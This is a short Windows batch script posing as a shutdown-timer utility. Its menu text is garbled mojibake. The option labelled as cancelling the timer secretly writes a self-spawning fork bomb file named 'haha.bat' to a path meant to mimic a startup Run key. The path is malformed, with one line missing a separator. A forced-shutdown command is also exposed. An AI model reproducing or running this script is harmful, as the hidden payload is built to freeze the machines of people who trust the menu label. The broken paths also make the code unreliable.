@echo off
title �ƿ�С����v1.0
:menu
cls
echo ============================
echo            �˵�
echo          1.��ʱ�ػ�
echo          2.ȡ����ʱ
echo          3.�˳�����
echo ============================

set /p num=���ѡ��
if "%num%" == "1" goto 1
if "%num%" == "2" goto 2
if "%num%" == "3" goto 3
echo ����������1��2��3 
pause
goto menu

:1
set /p a=����ػ�ʱ�䣨��λ\�룩��
shutdown -s -f -t %a%
goto menu

:2
echo :a >> �����\HKEY_CURRENT_USER\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run\haha.bat 
echo start >>�����\HKEY_CURRENT_USER\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Runhaha.bat
echo goto a >> �����\HKEY_CURRENT_USER\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run\haha.bat
shutdown -a
goto menu

:3
exit